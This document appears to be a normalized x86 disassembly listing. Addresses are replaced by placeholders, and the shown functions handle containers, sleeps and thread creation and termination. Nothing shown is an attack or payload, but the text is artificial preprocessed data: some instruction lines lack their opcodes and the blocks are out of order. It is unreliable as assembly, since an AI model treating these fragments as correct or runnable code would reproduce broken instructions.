mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
push r--data
mov [ ecx ] dx
call sub_403650
mov ecx [ edi + 0x1c ]
mov eax [ ecx ]
mov edx [ eax ]
call edx
cmp eax ebx
je r-xdata
mov [ edi + 0x5c ] eax
push ebx
push ebx
push eax
push ecx
push edx
call sub_4033e0
add esp 0x14
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ edi + 0x60 ] eax
sub_404000
push ebp
mov ebp esp
push 0xffffffff
push sub_42d02b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov [ ebp - 0x1c ] ebx
push 0x190
call [ Sleep@IAT ]
push 0x18
call sub_41ac18
add esp 0x4
mov [ ebp - 0x20 ] eax
xor edi edi
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
mov ecx edi
mov [ ebp - 0x4 ] 0xffffffff
call j_sub_4124d0
mov ecx [ ebx + 0x20 ]
mov esi eax
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
push esi
call edx
test al al
je r-xdata
push 0xb
push rw-data
push 0x4a
push rw-data
mov ecx eax
call sub_412430
mov edi eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test edi edi
je r-xdata
push esi
call sub_41a7eb
add esp 0x4
mov ecx ebx
call sub_403f30
mov ecx [ ebx + 0xc ]
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
mov esi [ ebx + 0x28 ]
sub esi [ ebx + 0x24 ]
xor ecx ecx
sar esi 0x2
mov eax esi
mov edx 0x4
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_4195a1
mov ebx eax
xor ecx ecx
mov eax esi
mov edx 0x4
mul edx
seto cl
mov [ ebp - 0x10 ] ebx
neg ecx
or ecx eax
push ecx
call sub_4195a1
xor edi edi
add esp 0x8
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x14 ] edi
test esi esi
je r-xdata
mov ecx edi
call sub_412460
push edi
call sub_41a0d6
add esp 0x4
mov ecx [ ebx ]
push 0xffffffff
push ecx
call [ WaitForSingleObject@IAT ]
mov edx [ ebx ]
push edx
call [ CloseHandle@IAT ]
mov edi 0x1
cmp esi edi
jbe r-xdata
mov ecx eax
sub ecx ebx
mov [ ebp - 0x18 ] ecx
jmp r-xdata
push ebx
call sub_41ace4
mov edx [ ebp - 0x20 ]
push edx
call sub_41ace4
add esp 0x8
lea ecx [ ecx ]
mov eax [ ebp - 0x1c ]
mov edx [ eax + 0x24 ]
add ecx ebx
push ecx
lea eax [ edx + edi * 4 ]
mov eax [ eax ]
push 0x0
push eax
push sub_402e50
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov [ ebx ] eax
inc edi
add ebx 0x4
cmp edi esi
jb r-xdata
mov ecx [ ebx + edi * 4 ]
lea eax [ ebp - 0x14 ]
push eax
push ecx
call [ GetExitCodeThread@IAT ]
mov edx [ ebp - 0x14 ]
mov eax [ ebx + edi * 4 ]
push edx
push eax
call [ TerminateThread@IAT ]
mov ecx [ ebx + edi * 4 ]
push ecx
call [ CloseHandle@IAT ]
inc edi
cmp edi esi
jb r-xdata
mov ecx [ ebp - 0x18 ]
mov ebx [ ebp - 0x10 ]
sub_4041b0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn
push 0xffffffff
push 0x0
push esi
mov ecx edi
call sub_401ae0
add esi 0x1c
add edi 0x1c
cmp esi ebx
jne r-xdata
sub_4041e0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax [ ebp + 0xc ]
je r-xdata
mov eax [ ebp + 0x10 ]
pop ebp
retn
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
lea edi [ eax + 0x14 ]
xor ebx ebx
add edi 0x1c
lea eax [ edi - 0x14 ]
add esi 0x1c
cmp eax [ ebp + 0xc ]
jne r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
lea eax [ edi - 0x14 ]
cmp esi eax
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ esi ] dx
cmp [ edi ] 0x8
jae r-xdata
mov ecx [ esi ]
push ecx
call sub_41a0d6
add esp 0x4
mov eax [ edi - 0x14 ]
mov [ esi ] eax
mov [ edi - 0x14 ] ebx
mov eax [ edi - 0x4 ]
lea ecx [ eax + eax + 0x2 ]
push ecx
lea edx [ edi - 0x14 ]
push edx
push esi
call sub_41a460
add esp 0xc
jmp r-xdata
mov ecx [ edi - 0x4 ]
mov [ esi + 0x10 ] ecx
mov edx [ edi ]
mov [ esi + 0x14 ] edx
mov [ edi - 0x4 ] ebx
mov [ edi ] ebx
sub_404270
push ebp
mov ebp esp
push 0xffffffff
push sub_42d061
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
lea esp [ esp ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] 0x1
cmp esi ebx
je r-xdata
add esi 0x1c
mov [ ebp - 0x4 ] bl
mov [ ebp + 0x10 ] esi
add edi 0x1c
jmp r-xdata
push 0xffffffff
push ebx
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
push edi
mov ecx esi
mov [ esi ] ax
call sub_401ae0
cmp edi [ ebp + 0xc ]
je r-xdata
sub_4042e8
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x10 ]
cmp esi edi
je r-xdata
xor ebx ebx
push ebx
push ebx
call sub_41ac98
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x14 ]
push esi
push ebx
call sub_402370
add esi 0x1c
add esp 0x8
cmp esi edi
jne r-xdata
sub_404330
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
cmp ecx esi
je r-xdata
pop esi
pop ebp
retn
push ebx
add ecx 0x8
add eax 0x8
cmp ecx esi
jne r-xdata
mov [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
cmp eax ecx
je r-xdata
test eax eax
je r-xdata
pop ebx
mov ebx [ ecx + 0x4 ]
mov edx [ eax + 0x4 ]
mov [ eax + 0x4 ] ebx
mov [ ecx + 0x4 ] edx
mov ebx [ ecx ]
mov edx [ eax ]
mov [ eax ] ebx
mov [ ecx ] edx
sub_404380
push ebp
mov ebp esp
push 0xffffffff
push sub_42d093
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov esi [ ebx + 0x28 ]
sub esi [ ebx + 0x24 ]
push 0x1
sar esi 0x2
lea eax [ esi + esi * 2 ]
push eax
mov [ ebp - 0x18 ] eax
call sub_41acef
add esp 0x8
mov [ ebp - 0x14 ] eax
test eax eax
jne r-xdata
mov edi eax
mov [ ebp - 0xd ] 0x0
test esi esi
je r-xdata
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x10
call sub_41ac18
mov esi eax
add esp 0x4
mov [ ebp - 0x24 ] esi
xor edi edi
mov [ ebp - 0x4 ] edi
cmp esi edi
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
movzx ecx [ rw-data ]
mov edx [ ebx ]
mov eax [ edx + 0xc ]
mov [ ebp - 0x20 ] ecx
mov ecx ebx
call eax
mov cl [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
movzx eax ax
mov [ esi + 0x4 ] ax
mov eax [ ebp - 0x18 ]
mov [ esi + 0x6 ] 0x2
mov [ esi + 0x7 ] cl
mov [ esi + 0x8 ] edx
mov [ esi + 0xc ] eax
mov [ esi ] edi
jmp r-xdata
mov ecx [ ebx + 0x24 ]
mov ecx [ ecx + eax * 4 ]
mov edx [ ecx ]
mov eax [ edx + 0xc ]
call eax
movzx eax ax
test ax ax
je r-xdata
mov esi [ ebp - 0x18 ]
sub esp 0x8
mov eax esp
mov [ ebp - 0x24 ] esp
mov [ ebp - 0x20 ] eax
mov [ eax ] edi
mov [ eax + 0x4 ] edi
cmp esi edi
je r-xdata
mov eax [ ecx ]
mov ecx [ ebp - 0x1c ]
mov [ ecx ] eax
push esi
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] edi
call sub_403140
mov ecx [ ebx + 0x38 ]
mov [ ebp - 0x4 ] 0x1
cmp ecx [ ebx + 0x3c ]
je r-xdata
mov al [ ebp - 0xd ]
inc al
mov [ ebp - 0xd ] al
movzx eax al
cmp eax esi
jb r-xdata
mov ecx [ ebp - 0x14 ]
add ecx [ ebp - 0x18 ]
cmp edi ecx
jae r-xdata
mov ecx ebx
call sub_403df0
mov [ ebp - 0x4 ] 0xffffffff
test esi esi
je r-xdata
mov edx [ esi + 0x4 ]
cmp edx edi
je r-xdata
mov [ edi ] ax
mov al [ rw-data ]
mov [ edi + 0x2 ] al
add edi 0x3
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov esi [ ebp - 0x18 ]
lea ecx [ edx + 0x1 ]
lea edi [ esi + 0x4 ]
mov eax edx
[ edi ] ecx
cmp eax edx
je r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov esi [ ebp - 0x18 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x20 ]
push esi
push edx
call sub_4030d0
jmp r-xdata
mov edx [ esi + 0x4 ]
test edx edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
sub_404540
push ebp
mov ebp esp
push 0xffffffff
push sub_42d0c0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov [ ebp - 0x18 ] edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
call sub_404380
lea ebx [ ebx ]
mov ecx [ edi + 0xc ]
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] ebx
call sub_4016a0
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x2
cmp eax ebx
je r-xdata
mov ecx [ eax + ecx * 4 ]
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
push eax
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
call sub_403140
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x4 ] 0x1
cmp eax ebx
je r-xdata
mov esi [ ebp - 0x28 ]
jmp r-xdata
cmp [ eax ] ebx
jne r-xdata
mov esi [ ebp - 0x20 ]
jmp r-xdata
mov ecx 0xffff
cmp [ eax + 0x4 ] cx
je r-xdata
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov esi [ ebp - 0x28 ]
sub esp 0x8
mov edi esp
mov [ ebp - 0x1c ] esp
mov [ edi ] ebx
mov [ edi + 0x4 ] ebx
mov ebx esi
mov [ ebp - 0x1c ] eax
test esi esi
je r-xdata
cmp [ eax + 0x4 ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0x0
cmp esi ebx
je r-xdata
mov esi [ ebp - 0x20 ]
sub esp 0x8
mov edi esp
mov [ ebp - 0x1c ] esp
mov [ edi ] ebx
mov [ edi + 0x4 ] ebx
mov ebx esi
mov [ ebp - 0x1c ] eax
test esi esi
je r-xdata
push 0x64
call [ Sleep@IAT ]
mov [ ebp - 0x4 ] 0x0
cmp esi ebx
je r-xdata
mov [ ebp - 0x4 ] 0x0
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x18 ]
call sub_4037b0
mov edi [ ebp - 0x18 ]
xor ebx ebx
mov ecx [ ebx + 0x4 ]
test ecx ecx
je r-xdata
inc [ ebp - 0x11 ]
jmp r-xdata
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov ecx [ ebp - 0x18 ]
call sub_403df0
mov edi [ ebp - 0x18 ]
xor ebx ebx
mov ecx [ ebx + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x11 ] 0x1
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov esi [ ebp - 0x28 ]
lea edx [ ecx + 0x1 ]
lea esi [ ebx + 0x4 ]
mov eax ecx
[ esi ] edx
cmp eax ecx
jne r-xdata
mov eax [ edi + 0x24 ]
mov edx [ edi + 0x28 ]
movzx ecx [ ebp - 0x11 ]
sub edx eax
sar edx 0x2
cmp ecx edx
jae r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov esi [ ebp - 0x20 ]
lea edx [ ecx + 0x1 ]
lea esi [ ebx + 0x4 ]
mov eax ecx
[ esi ] edx
cmp eax ecx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
jmp r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov eax [ ebp - 0x1c ]
mov [ edi + 0x4 ] ebx
mov [ edi ] eax
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax [ ebp - 0x1c ]
mov [ edi + 0x4 ] ebx
mov [ edi ] eax
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
sub_404800
push ebp
mov ebp esp
push 0xffffffff
push sub_42d0f1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
lea esp [ esp ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] 0x1
cmp esi ebx
je r-xdata
add esi 0x1c
mov [ ebp - 0x4 ] bl
mov [ ebp + 0x10 ] esi
add edi 0x1c
jmp r-xdata
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
push edi
mov ecx esi
mov [ esi ] ax
call sub_403a40
cmp edi [ ebp + 0xc ]
je r-xdata
sub_404875
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x10 ]
cmp esi edi
je r-xdata
xor ebx ebx
push ebx
push ebx
call sub_41ac98
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x14 ]
push esi
push ebx
call sub_402370
add esi 0x1c
add esp 0x8
cmp esi edi
jne r-xdata
sub_4048b0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
add ecx 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
push edx
push eax
call sub_404270
add esp 0x14
pop ebp
retn 0xc
sub_4048e0
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
push ecx
mov ecx [ esi + 0x4 ]
lea edx [ esi + 0xc ]
push edx
push ecx
push eax
call sub_403d90
mov edx [ esi ]
push edx
call sub_41a0d6
add esp 0x14
sub_404930
push ebp
mov ebp esp
push 0xffffffff
push sub_42d110
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov eax [ ebp + 0x8 ]
cmp eax 0x1fffffff
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx [ esi ]
sar ecx 0x3
cmp ecx eax
jae r-xdata
push r--data
call sub_4194e6
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edi [ esi + 0xc ]
push eax
mov ecx edi
call sub_403070
mov edx [ ebp + 0x8 ]
mov ecx [ esi ]
push edx
push 0x0
mov ebx eax
mov eax [ esi + 0x4 ]
push edi
push ebx
push eax
push ecx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] 0x0
call sub_404330
mov ecx [ esi + 0x4 ]
mov eax [ esi ]
mov edi ecx
sub edi eax
add esp 0x18
sar edi 0x3
mov [ ebp - 0x4 ] 0xffffffff
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
lea edx [ ebx + ecx * 8 ]
lea eax [ ebx + edi * 8 ]
mov [ esi + 0x8 ] edx
mov [ esi + 0x4 ] eax
mov [ esi ] ebx
mov edx [ ebp + 0x8 ]
push edx
lea edx [ esi + 0xc ]
push edx
push ecx
push eax
call sub_403d90
mov eax [ esi ]
push eax
call sub_41a0d6
add esp 0x14
sub_404a20
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
mov ecx [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x1c ]
mov [ edi ] eax
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
xor bl bl
add eax edx
je r-xdata
mov eax [ edi ]
push 0x1
push eax
call sub_41acef
mov ebx eax
add esp 0x8
mov [ ebp - 0x4 ] ebx
test ebx ebx
jne r-xdata
xor ecx ecx
mov dx [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ eax + ebx ] dx
mov cl [ ebp + 0xa ]
mov edx [ rw-data ]
mov [ edx + ebx ] cl
mov al [ ebp + 0xb ]
mov ecx [ rw-data ]
mov esi [ rw-data ]
mov [ ecx + ebx ] al
mov edi [ ebp + 0x10 ]
mov ecx edi
sub ecx [ ebp + 0xc ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add esi ebx
add eax edx
mov [ ebp + 0x1f ] 0x0
je r-xdata
mov [ edi ] eax
test esi esi
je r-xdata
lea edx [ ecx * 8 ]
sub edx ecx
mov ecx [ esi + edx * 4 + 0x10 ]
inc bl
lea edx [ ecx + ecx + 0x3 ]
add [ edi ] edx
movzx ecx bl
cmp ecx eax
jb r-xdata
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
xor ebx ebx
jmp r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov ecx [ ebp + 0x1c ]
mov eax [ ebp + 0x10 ]
push ecx
lea edx [ ebp + 0x18 ]
push edx
push eax
push esi
call sub_402460
mov ecx [ ebp + 0xc ]
push ecx
call sub_41a0d6
add esp 0x14
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x18
cmp esi edi
je r-xdata
mov cl [ rw-data ]
lea edi [ ebx * 8 ]
sub edi ebx
mov [ esi ] cl
mov edx [ ebp + 0xc ]
add edi edi
add edi edi
mov eax [ edi + edx + 0x10 ]
lea ecx [ edi + edx ]
inc esi
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
push esi
call sub_41a0d6
mov ebx [ ebp - 0x4 ]
add esp 0x4
mov ebx 0x7
lea edx [ eax + eax ]
push edx
push ecx
add eax eax
push eax
push esi
call sub_41ad2f
mov eax [ ebp + 0xc ]
mov ecx [ edi + eax + 0x10 ]
mov edi [ ebp + 0x10 ]
lea esi [ esi + ecx * 2 + 0x2 ]
mov cl [ ebp + 0x1f ]
inc cl
movzx ebx cl
mov [ ebp + 0x1f ] cl
mov ecx edi
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
add esp 0x10
cmp ebx eax
jb r-xdata
mov ecx [ ecx ]
xor edx edx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] 0x0
mov [ esi ] dx
add esi 0x1c
cmp esi edi
jne r-xdata
mov ecx [ esi ]
push ecx
call sub_41a0d6
add esp 0x4
mov ebx [ ebp - 0x4 ]
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov esi [ ebp + 0xc ]
sub_404be0
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
cmp ecx eax
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
push edi
push edx
push ecx
push eax
push eax
call sub_4041e0
mov edx [ esi + 0x4 ]
mov edi eax
mov eax [ ebp - 0x4 ]
push eax
lea ecx [ esi + 0xc ]
push ecx
push edx
push edi
call sub_402460
add esp 0x20
mov [ esi + 0x4 ] edi
pop edi
sub_404c20
push ebp
mov ebp esp
mov eax [ ecx + 0x4 ]
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ecx ]
push edi
sub eax esi
mov edi 0x1fffffff
sar eax 0x3
sub edi edx
cmp edi eax
jae r-xdata
add eax edx
mov edx [ ecx + 0x8 ]
sub edx esi
sar edx 0x3
cmp eax edx
jbe r-xdata
push r--data
call sub_4194e6
pop edi
pop esi
pop ebp
retn 0x4
mov esi edx
shr esi 0x1
mov edi 0x1fffffff
sub edi esi
cmp edi edx
jae r-xdata
add edx esi
xor edx edx
jmp r-xdata
push edx
call sub_404930
mov edx eax
cmp edx eax
jae r-xdata
sub_404c80
push ebp
mov ebp esp
push 0xffffffff
push sub_42d130
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov ebx [ ebp + 0x8 ]
cmp ebx 0x9249249
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx [ esi ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax ebx
jae r-xdata
push r--data
call sub_4194e6
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edi [ esi + 0xc ]
push ebx
mov ecx edi
call sub_401280
mov ebx [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
push ebx
push 0x0
push edi
push eax
push ecx
push edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x0
call sub_404800
mov ebx [ esi ]
mov ecx [ esi + 0x4 ]
sub ecx ebx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov edi edx
shr edi 0x1f
add esp 0x18
add edi edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax * 8 ]
sub ecx eax
mov eax [ ebp - 0x14 ]
lea edx [ eax + ecx * 4 ]
lea ecx [ edi * 8 ]
sub ecx edi
mov [ esi + 0x8 ] edx
lea edx [ eax + ecx * 4 ]
mov [ esi + 0x4 ] edx
mov [ esi ] eax
mov ecx [ ebp + 0x8 ]
push ecx
lea eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x4 ]
push eax
push ebx
call sub_402460
mov edx [ esi ]
push edx
call sub_41a0d6
add esp 0x14
sub_404da0
push ebp
mov ebp esp
push 0xffffffff
push sub_42d163
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov cx [ ebp + 0x8 ]
lea eax [ ebp - 0x14 ]
push eax
sub esp 0x14
mov eax esp
mov [ eax ] cx
mov edx [ ebp + 0x8 ]
shr edx 0x10
mov [ eax + 0x2 ] dl
mov ecx [ ebp + 0x8 ]
shr ecx 0x18
lea edx [ ebp + 0xc ]
xor esi esi
mov [ ebp - 0x18 ] esp
mov [ eax + 0x3 ] cl
push edx
lea ecx [ eax + 0x4 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x14 ] esi
call sub_402580
mov ecx edi
call sub_404a20
push 0x10
mov ebx eax
call sub_41ac18
add esp 0x4
cmp eax esi
je r-xdata
xor ebx ebx
movzx ecx [ rw-data ]
xor edx edx
mov [ eax + 0x7 ] cl
mov ecx [ ebp - 0x14 ]
mov [ eax + 0x8 ] ebx
mov [ eax + 0x4 ] dx
mov [ eax + 0x6 ] dl
mov [ eax + 0xc ] ecx
mov [ eax ] esi
mov ebx eax
jmp r-xdata
push 0xb
push rw-data
mov ecx esi
mov [ ebp - 0x4 ] 0x0
call sub_4124b0
push 0x8
push rw-data
mov ecx esi
call sub_412490
movzx ecx [ ebp + 0x8 ]
push ecx
sub esp 0x1c
mov edx esp
mov [ ebp - 0x18 ] esp
push edx
mov ecx esi
call sub_412790
mov ecx [ edi + 0x1c ]
mov eax [ ecx ]
mov edi [ ebp - 0x14 ]
mov edx [ eax + 0xc ]
push edi
call edx
mov [ ebp - 0xd ] al
test esi esi
je r-xdata
mov ecx eax
call sub_412420
mov esi eax
mov ecx [ edi + 0x10 ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
push ebx
call eax
push 0x18
mov [ ebp - 0x14 ] eax
call sub_41ac18
add esp 0x4
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] 0x1
cmp eax esi
je r-xdata
test ebx ebx
je r-xdata
mov ecx esi
call sub_412460
push esi
call sub_41a0d6
add esp 0x4
test edi edi
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
push ebx
call sub_41a0d6
add esp 0x4
push eax
call sub_41a7eb
add esp 0x4
mov al [ ebp - 0xd ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov ecx [ ebp + 0x18 ]
push ecx
mov ecx [ ebp + 0x10 ]
lea edx [ ebp + 0x18 ]
push edx
push ecx
push eax
call sub_402460
mov edx [ ebp + 0xc ]
push edx
call sub_41a0d6
add esp 0x14
push edi
call sub_41a0d6
add esp 0x4
push eax
call sub_41a7eb
add esp 0x4
sub_404f40
push ebp
mov ebp esp
push ecx
push esi
